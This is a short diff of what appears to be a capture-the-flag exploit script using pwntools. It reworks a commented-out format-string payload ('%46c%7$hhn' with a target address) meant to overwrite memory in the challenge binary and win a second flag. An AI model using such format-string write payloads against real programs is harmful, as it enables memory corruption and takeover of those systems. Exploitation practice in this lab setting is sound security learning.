@@ -247,6 +247,7 @@ while True:
     # Name - Flag 1
     r.sendline('pwned')
     # Name - Flag 2
-    #r.sendline('\xb8\xa2\x04\x08%46c%7$hhn')
+    # shellcode = p32(0x804a2b8) + '%46c%7$hhn'
+    # r.sendline(shellcode)
     r.interactive()
     r.close()
